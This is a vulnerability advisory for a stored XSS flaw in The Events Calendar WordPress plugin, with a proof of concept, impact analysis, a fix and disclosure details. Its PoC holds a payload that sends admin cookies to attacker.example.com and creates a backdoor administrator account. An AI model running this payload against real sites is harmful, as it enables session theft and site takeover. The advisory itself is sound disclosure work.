# TEC-XSS-012: Stored XSS in Post Editor Error Meta Display

## Metadata
- **Plugin:** The Events Calendar
- **Severity:** Medium (CVSS 5.4) — **Highest severity finding in this research**
- **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
- **CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation
- **Auth Required:** Contributor (to write post meta on their own posts)
- **User Interaction:** Required (admin/editor must open the post in editor)

## Summary

`Post_Exception::displayMessage($postId)` reads `_EventErrorSave` post meta and echoes it unescaped inside a `<script>` block on the post editor screen. A contributor-level user who can create draft `tribe_events` posts can set arbitrary post meta, injecting JavaScript that fires when any admin or editor opens the event in the WordPress editor.

**This is a privilege escalation vector: Contributor → Admin session theft.**

## Vulnerable Code

**File:** `src/Tribe/Admin/Notice/Exceptions/Post_Exception.php`

```php
public static function displayMessage($postId) {
    $error = get_post_meta($postId, '_EventErrorSave', true);
    if (empty($error)) return;
    ?>
    <script>
        jQuery(document).ready(function() {
            jQuery('.tribe-events-header')
                .append('<div class="error"><p><?php echo $error; ?></p></div>');
        });
    </script>
    <?php
}
```

## Data Flow

```
SOURCE: get_post_meta($postId, '_EventErrorSave', true)
  → $error = [user-controlled post meta value]
  → echo $error  ← NO ESCAPING
SINK: Output inside <script> block on post editor page
```

## Proof of Concept

### Step 1: Create a Draft Event with XSS Payload

```bash
# As a contributor (or admin for testing):
docker compose -f docker/docker-compose.yml exec -T wpcli \
  php -d memory_limit=1024M /usr/local/bin/wp eval '
    $post_id = wp_insert_post([
      "post_title" => "Innocent Looking Event",
      "post_type" => "tribe_events",
      "post_status" => "draft",
      "post_author" => 1
    ]);

    update_post_meta($post_id, "_EventErrorSave",
      "</script><script>
        // Steal admin cookie and send to attacker
        var img = new Image();
        img.src = \"https://attacker.example.com/steal?c=\" + encodeURIComponent(document.cookie);
        // Or create a new admin user
        jQuery.post(ajaxurl, {
          action: \"createuser\",
          _wpnonce: jQuery(\"#_wpnonce\").val(),
          user_login: \"backdoor\",
          email: \"evil@attacker.com\",
          pass1: \"P@ssw0rd123!\",
          role: \"administrator\"
        });
      </script><script>"
    );

    echo "Created event post ID: $post_id\n";
    echo "Edit URL: http://localhost:8880/wp-admin/post.php?post=$post_id&action=edit\n";
  ' --skip-plugins
```

### Step 2: Trick an Admin into Editing the Post

The attacker (contributor) submits the event for review. When an admin opens it in the editor, the XSS fires.

### Step 3: Verify

```bash
# Get the post ID from step 1, then:
curl -s -c cookies.txt -X POST http://localhost:8880/wp-login.php \
  -d "log=admin&pwd=admin&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F"

curl -s -b cookies.txt \
  "http://localhost:8880/wp-admin/post.php?post=<POST_ID>&action=edit" \
  | grep -c 'attacker.example.com'
# Returns 1+ if XSS payload is in the page
```

### Step 4: Clean Up

```bash
docker compose -f docker/docker-compose.yml exec -T wpcli \
  php -d memory_limit=1024M /usr/local/bin/wp post delete <POST_ID> --force --skip-plugins
```

## Impact

- **Privilege escalation:** Contributor → Administrator
- **Session hijacking:** Admin cookies exfiltrated
- **Persistent backdoor:** Attacker creates admin account via AJAX
- **Blast radius:** Every admin/editor who opens the poisoned event is compromised

## Why This Is the Most Serious Finding

1. **Low privilege requirement** — only needs Contributor role
2. **Natural trigger** — admins routinely review contributor submissions
3. **No nonce needed** — the meta write happens at post creation, not via AJAX
4. **Cross-scope** — contributor's script runs in admin's session context

## Remediation

```php
// Before:
echo $error;

// After:
echo esc_js($error);

// Or strip HTML entirely:
echo esc_html(wp_strip_all_tags($error));
```

## Disclosure

- Report to: security@theeventscalendar.com
- Standard 90-day responsible disclosure timeline
- This finding affects all versions with Post_Exception::displayMessage()
